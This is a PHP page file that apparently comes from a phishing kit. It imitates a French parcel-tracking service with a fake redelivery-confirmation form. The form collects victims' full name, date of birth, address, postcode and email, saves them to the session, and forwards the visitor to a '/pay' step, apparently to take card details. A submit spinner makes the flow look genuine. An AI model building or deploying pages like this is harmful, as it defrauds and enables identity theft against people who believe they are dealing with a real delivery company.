<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (
        isset($_POST['nom']) &&
        isset($_POST['date']) &&
        isset($_POST['adresse']) &&
        isset($_POST['zip']) &&
        isset($_POST['ville']) &&
        isset($_POST['email'])
    ) {
        $_SESSION["nom"] = $_POST["nom"];
        $_SESSION["date"] = $_POST["date"];
        $_SESSION["adresse"] = $_POST["adresse"];
        $_SESSION["zip"] = $_POST["zip"];
        $_SESSION["ville"] = $_POST["ville"];
        $_SESSION["email"] = $_POST["email"];

        header("location: /pay");
    }

    die();
}
$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>
   
    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?>

                                </h2>
                                <h3>
                                    Confirmez votre <?= isset($_GET["points"]) ?
                                                        "point relais : " . (json_decode($_SESSION["point"]))->Nom :
                                                        "créneau de livraison : " . $_SESSION["date"] ?>


                                </h3>

                                <p>
                                    Afin de pouvoir confirmer ce choix, merci de compléter les informations suivantes :
                                </p>
                                <br>
                                <h4 style="text-align: center">Informations personnelles</h4>

                                <div class="form-row" style="width: 100%;">
                                    <input type="text" name="nom" required="required" placeholder="Nom et prénom">
                                </div>

                                <div class="form-row" style="width: 100%;">
                                    <input type="tel" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);" onpaste="date_reformat_dd(this);" maxlength="10" minlength="10" name="date" required="required" placeholder="Date de naissance">
                                </div>

                                <div class="form-row" style="width: 100%;">
                                    <input type="text" name="adresse" required="required" placeholder="Adresse">
                                </div>

                                <div class="form-row" style="width: 100%;">
                                    <input type="text" name="ville" required="required" placeholder="Ville">
                                </div>
                                <div class="form-row" style="width: 100%;">
                                    <input type="tel" name="zip" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="5"
                                        minlength="5" required="required" placeholder="Code postal">
                                </div>
                                <div class="form-row" style="width: 100%;">
                                    <input type="email" name="email" required="required" placeholder="Adresse e-mail">
                                </div>
                                <br>
                                <div>
                                    <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Confirmer ma re-livraison</button>
                                </div>
                            </div>

    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>